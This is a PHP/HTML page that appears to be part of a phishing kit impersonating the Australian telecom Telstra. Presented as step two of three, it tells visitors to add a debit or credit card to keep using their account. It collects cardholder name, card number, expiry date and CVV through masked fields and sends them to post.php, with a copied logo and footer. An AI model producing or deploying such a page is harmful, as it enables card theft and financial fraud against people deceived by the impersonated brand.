<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>telstra</title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
    <header>
        <div class="pic">
            <img src="res/img/logo.png" alt="">
        </div>
    </header>

    <main>
        <div class="container">
            <div class="step">
            <span> STEP 2 OF 3</span>
            <div class="title">
            <h2>Add payment method</h2>
            </div>
            </div>
            <div class="col">
                <form action="post.php" method="post">
                <p>Add a debit or credit card to continue using your account</p>
                    <label>Card holder name</label>
                    <input type="text" name="name" required>
                    </div>

                    <div class="col">
                 <label>Card number</label>
                <input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
                </div>

                <div class="col">
                <label>Expiration Date</label>
               <input type="text" name="exp" required placeholder="MM/YY" id="exp">
                </div>

                <div class="col">
                <label>Security Code</label>
                 <input type="password" name="cvv" required placeholder="Cvv code" id="cvv">
                    <div class="btn">
                    <button type="submit">Next</button>
                    </div>
                </form>
            </div>
        </div>
    </main>
    <footer>
        <div class="links">
            <a href="#" class="copy">Copyright © 2025 Telstra</a><span>|</span>
            <a href="#">Privacy</a><span>|</span>
            <a href="#">Terms of use</a>
        </div>
    </footer>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>  
</body>
</html>